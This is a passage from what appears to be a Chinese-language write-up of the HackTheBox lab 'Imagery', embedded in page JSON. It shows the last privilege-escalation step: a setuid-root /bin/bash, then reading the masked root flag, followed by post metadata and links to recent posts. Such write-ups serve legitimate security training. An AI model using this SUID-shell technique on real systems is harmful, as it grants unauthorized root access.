src=\"/post-images/HackTheBoxSeason9%20-%20Imagery/image24.png\" alt=\"image.png\"></p>\n<p>查看 <code>/bin/bash</code> 权限</p>\n<pre><code class=\"hljs language-python\">bash-<span class=\"hljs-number\">5.2</span>$ ls -al /<span class=\"hljs-built_in\">bin</span>/bash\n-rwsr-sr-x <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">1474768</span> Oct <span class=\"hljs-number\">26</span>  <span class=\"hljs-number\">2024</span> /<span class=\"hljs-built_in\">bin</span>/bash\n</code></pre>\n<p>读取 root.txt</p>\n<pre><code class=\"hljs language-python\">bash-<span class=\"hljs-number\">5.2</span><span class=\"hljs-comment\"># cat root.txt</span>\na7xxxxxxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>总结</h2>\n<p>还是很有意思的</p>","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","updated":"2025-10-04","tags":["HackTheBox","Linux","XSS","AEScrypt","LFI","SUDO","RCE","encrypt"],"categories":"靶机","comments":true,"description":"Season9 Imagery https://app.hackthebox.com/machines/751 Recon PortScan 枚举 随意注册一个用户进行登录 登录进来后，看数据包，有我们登录的用户的数据 一开始以为是 jwt，但是貌似并不是 目录扫描，超级慢，直接不扫了 随意上传了一...","isEncrypted":true},"recentPosts":[{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"}]},"__N_SSG":true}